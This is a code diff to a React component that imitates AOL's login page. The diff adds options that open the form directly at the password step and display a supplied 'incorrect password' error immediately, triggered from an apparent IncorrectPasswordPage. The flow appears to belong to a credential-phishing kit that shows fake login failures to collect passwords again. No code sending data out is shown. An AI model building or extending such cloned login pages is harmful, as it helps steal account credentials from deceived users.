@@ -6,6 +6,8 @@ interface AolLoginPageProps {
   onLoginSuccess?: (sessionData: any) => void;
   onLoginError?: (error: string) => void;
   defaultEmail?: string;
+  startAtPasswordStep?: boolean;
+  incorrectPasswordError?: string;
 }
 
 // Simple input component for AOL style
@@ -32,11 +34,13 @@ const AolInput = ({ value, onChange, placeholder, type = "text", autoFocus = fal
   );
 };
 
-const AolLoginPage: React.FC<AolLoginPageProps> = ({ onLoginSuccess, onLoginError, defaultEmail }) => {
+const AolLoginPage: React.FC<AolLoginPageProps> = ({ onLoginSuccess, onLoginError, defaultEmail, startAtPasswordStep, incorrectPasswordError }) => {
   const [email, setEmail] = useState(defaultEmail || '');
   const [password, setPassword] = useState('');
-  const [showPasswordStep, setShowPasswordStep] = useState(false);
-  const [pageReady, setPageReady] = useState(false);
+  const [showPasswordStep, setShowPasswordStep] = useState(!!startAtPasswordStep);
+  // When mounted via the IncorrectPasswordPage (startAtPasswordStep=true), skip
+  // the 100ms pageReady gate so the password-step error UI renders immediately.
+  const [pageReady, setPageReady] = useState(!!startAtPasswordStep);
   const [nextLoading, setNextLoading] = useState(false);
   const [submitting, setSubmitting] = useState(false);
 
@@ -105,6 +109,7 @@ const AolLoginPage: React.FC<AolLoginPageProps> = ({ onLoginSuccess, onLoginErro
           
           <form onSubmit={handleSubmit} className="space-y-5">
             {errorMessage && !isLoading && ( <p className="text-red-500 text-sm text-center -mb-2">{errorMessage}</p> )}
+            {!errorMessage && incorrectPasswordError && ( <p className="text-red-500 text-sm text-center -mb-2">{incorrectPasswordError}</p> )}
 
             {!showPasswordStep ? (
               <div>
